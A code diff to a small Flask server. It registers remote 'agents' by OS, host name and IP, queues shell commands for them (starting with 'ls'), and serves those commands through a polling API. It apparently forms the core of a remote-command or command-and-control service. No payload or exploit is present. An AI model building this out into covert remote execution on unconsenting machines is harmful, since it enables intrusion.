@@ -4,7 +4,9 @@ from flask import Flask, render_template, redirect, url_for, request, session, f
 from flask_sqlalchemy import SQLAlchemy
 from functools import wraps
 from dotenv import load_dotenv
-
+from sqlalchemy.sql import exists
+from sqlalchemy.sql import select
+from sqlalchemy.inspection import inspect
 
 load_dotenv()
 
@@ -19,7 +21,6 @@ app.config.from_object(os.getenv('APP_SETTINGS'))
 
 # create the sqlalchemy object
 db = SQLAlchemy(app)
-
 
 from models import *
 
@@ -36,8 +37,20 @@ def login_required(f):
 
 
 def add_agent(os, host_name, ip, ram):
-    db.session.add(Agent(os, host_name, ip, ram))
-    db.session.commit()
+    if not db.session.query(db.exists().where(Agent.ip == ip)).scalar():
+        agent = Agent(os, host_name, ip, ram)
+        db.session.add(agent)
+        db.session.flush()
+        agent_id = agent.id
+        print(agent_id)
+        db.session.add(CommandQueue(agent_id, 'ls'))
+        db.session.commit()
+        print(agent_id)
+        return agent.id
+
+
+def add_command(queue: CommandQueue, command):
+    queue.command = command
 
 
 @app.route('/')
@@ -52,15 +65,19 @@ def agent_add():
     print(request.method)
     if request.method == 'POST':
         agent_dict = request.json
-        add_agent(agent_dict['os'], agent_dict['host_name'], agent_dict['ip'], agent_dict['ram'])
-    return redirect(url_for('home'))
+        id = add_agent(agent_dict['os'], agent_dict['host_name'], agent_dict['ip'], agent_dict['ram'])
+        print(id)
+        return str(id)
 
 
 @app.route('/api/1.1/get_command', methods=['GET', 'POST'])
 def get_command():
     print(request.method)
     if request.method == 'POST':
-        return 'ls'
+        agent_id = request.json['id']
+        print(agent_id)
+        res = db.session.query(CommandQueue).one()
+        return res.__dict__['command']
 
 
 @app.route('/welcome')
